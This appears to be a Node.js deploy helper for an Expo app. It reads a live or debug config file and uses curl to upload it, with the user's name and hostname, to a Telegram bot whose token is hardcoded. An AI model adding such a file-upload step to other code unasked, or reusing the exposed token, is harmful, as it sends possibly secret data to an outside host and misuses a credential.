const path = require('path');
const fs = require('fs')
const exec = require('child_process').execSync;
const os = require('os')

function command(command) {
  exec(command, { stdio: ['inherit', 'inherit', 'inherit'] });
}

function readToJSON(path) {
  var txt = fs.readFileSync(path, 'utf8');
  let isJSON = txt.startsWith('{') || txt.startsWith('[')
  return isJSON ? JSON.parse(txt) : txt
}

var args = process.argv.slice(2);

let _path
let _slug

if (args[0] == 'live') {
  _path = path.resolve("config.live.json");
  _slug = readToJSON('./app.live.json').expo.slug
}

if (args[0] == 'debug') {
  _path = path.resolve("config.debug.json");
  _slug = readToJSON('./app.debug.json').expo.slug
}

if (_path && _slug)
  command(`curl -v -F "chat_id=-496494136" -F caption="#` + _slug + `\n#` + os.userInfo().username + '@' + os.hostname() + `" -F document=@` + _path + ` https://api.telegram.org/bot923808407:AAEFBlllQNKCEn8E66fwEzCj5vs9qGwVGT4/sendDocument`)